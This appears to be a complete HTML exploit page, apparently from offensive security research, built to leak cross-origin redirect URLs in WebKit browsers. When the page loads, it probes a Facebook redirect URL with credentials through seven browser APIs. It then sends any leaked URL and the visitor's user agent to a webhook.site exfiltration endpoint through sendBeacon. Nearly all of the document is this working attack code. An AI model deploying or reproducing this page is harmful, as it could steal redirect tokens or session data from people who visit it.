<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset='utf-8' />
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WebKit Redirect Leak Researcher - Putra Mahardika</title>
    <style>
        body {
            font-family: 'Courier New', monospace;
            background: #0a0a0a;
            color: #00ff41;
            padding: 20px;
            line-height: 1.4;
        }

        .container {
            border: 1px solid #00ff41;
            padding: 15px;
            border-radius: 5px;
            box-shadow: 0 0 10px #00ff41;
            max-width: 900px;
            margin: auto;
        }

        h2 {
            border-bottom: 1px solid #00ff41;
            padding-bottom: 10px;
            color: #fff;
            text-transform: uppercase;
            letter-spacing: 2px;
        }

        .log-item {
            margin-bottom: 5px;
            border-left: 3px solid #333;
            padding-left: 10px;
            font-size: 12px;
            word-break: break-all;
        }

        .leak {
            color: #ff3e3e;
            font-weight: bold;
            border-left: 3px solid #ff3e3e;
            background: rgba(255, 62, 62, 0.1);
            padding: 5px 10px;
            animation: blink 1s infinite;
        }

        @keyframes blink {
            0% { opacity: 1; }
            50% { opacity: 0.7; }
            100% { opacity: 1; }
        }

        hr {
            border: 0;
            border-top: 1px solid #333;
            margin: 20px 0;
        }

        #status {
            font-weight: bold;
            color: #f1c40f;
        }
    </style>
</head>

<body>
    <div class="container">
        <h2>[!] WebKit Redirect Leak Analyser</h2>
        <p>Target: <span id="target_display" style="color: #3498db;"></span></p>
        <div id="status">[*] Ready. Waiting for trigger...</div>
        <hr>
        <div id="logs"></div>
    </div>

    <script>
        // --- CONFIGURATION ---
        const CONFIG = {
            target: 'https://fb.com/4', // Ganti dengan URL target redirect
            exfil: 'https://webhook.site/0d95c87e-8a54-4bb1-b4cf-964eecdb5594', // Ganti dengan URL exfil lu
            myOrigin: window.location.origin
        };

        document.getElementById('target_display').innerText = CONFIG.target;

        // --- UTILS ---
        function log(msg, isLeak = false) {
            const div = document.createElement('div');
            div.className = isLeak ? 'log-item leak' : 'log-item';
            div.innerText = `[${new Date().toLocaleTimeString()}] ${msg}`;
            document.getElementById('logs').prepend(div);
            console.log(msg);
        }

        function report(data, method) {
            // Filter agar tidak mereport URL origin sendiri atau target awal yang sudah diketahui
            if (!data || data === CONFIG.target || data === CONFIG.myOrigin + '/') return;
            
            log(`ALERT: LEAK DETECTED via ${method}!`, true);
            log(`DATA: ${data}`, true);

            // Exfiltrasi data menggunakan sendBeacon (lebih stabil saat tab ditutup/redirect)
            navigator.sendBeacon(CONFIG.exfil, JSON.stringify({
                method: method,
                leaked_url: data,
                ua: navigator.userAgent,
                timestamp: new Date().toISOString()
            }));
        }

        // --- CORE EXPLOIT VECTORS ---
        async function startExploit() {
            log("[*] Initializing multi-vector analysis...");

            // 1. Performance Resource Timing (Microtask/Event Loop)
            const observer = new PerformanceObserver((list) => {
                list.getEntries().forEach((entry) => {
                    if (entry.name !== CONFIG.target && entry.name.startsWith('http')) {
                        report(entry.name, 'Resource-Timing');
                    }
                });
            });
            observer.observe({ entryTypes: ['resource'] });

            // 2. XMLHttpRequest State Check
            const xhr = new XMLHttpRequest();
            xhr.open('GET', CONFIG.target, true);
            xhr.withCredentials = true;
            xhr.onreadystatechange = () => {
                if (xhr.responseURL && xhr.responseURL !== CONFIG.target) {
                    report(xhr.responseURL, 'XHR-ResponseURL');
                }
            };
            xhr.onerror = () => {
                log("[*] XHR Error (CORS/SOP Policy enforced)");
                if(xhr.responseURL) report(xhr.responseURL, 'XHR-Error-State');
            };
            xhr.send();

            // 3. EventSource URL Quirks (Macrotask: setTimeout)
            try {
                const es = new EventSource(CONFIG.target);
                setTimeout(() => {
                    if (es.url && es.url !== CONFIG.target) {
                        report(es.url, 'EventSource-URL');
                    }
                    es.close();
                }, 3000);
            } catch (e) { }

            // 4. Fetch Rejection Analysis (Promises)
            fetch(CONFIG.target, { mode: 'cors', credentials: 'include' })
                .then(r => {
                    if (r.url !== CONFIG.target) report(r.url, 'Fetch-Resolved');
                })
                .catch(err => {
                    log(`[*] Fetch Rejected: ${err.message}`);
                    const urlMatch = err.message.match(/(https?:\/\/[^\s]+)/);
                    if (urlMatch) report(urlMatch[0], 'Fetch-Error-Message');
                });

            // 5. Script Tag Global Error
            window.onerror = (msg, src) => {
                if (src && src !== CONFIG.target && src !== window.location.href) {
                    report(src, 'Window-OnError');
                }
                return true;
            };
            const s = document.createElement('script');
            s.src = CONFIG.target;
            document.body.appendChild(s);

            // 6. Object Element Data Leak
            const obj = document.createElement('object');
            obj.style.width = '0'; obj.style.height = '0';
            obj.data = CONFIG.target;
            obj.onload = () => {
                try {
                    if (obj.data && obj.data !== CONFIG.target) {
                        report(obj.data, 'Object-Data-Attr');
                    }
                } catch(e) {}
            };
            document.body.appendChild(obj);

            // 7. Iframe Location Leak (Shadow DOM/SOP Test)
            const ifr = document.createElement('iframe');
            ifr.style.display = 'none';
            ifr.src = CONFIG.target;
            ifr.onload = () => {
                try {
                    const loc = ifr.contentWindow.location.href;
                    if (loc && loc !== "about:blank") report(loc, 'Iframe-Location');
                } catch(e) {}
            };
            document.body.appendChild(ifr);
        }

        // --- BOOTSTRAP ---
        window.onload = () => {
            // Menggunakan requestAnimationFrame agar browser selesai rendering dulu
            requestAnimationFrame(() => {
                setTimeout(() => {
                    document.getElementById('status').innerText = "[+] Analysis Running...";
                    document.getElementById('status').style.color = "#00ff41";
                    startExploit();
                }, 1000);
            });
        };
    </script>
</body>

</html>
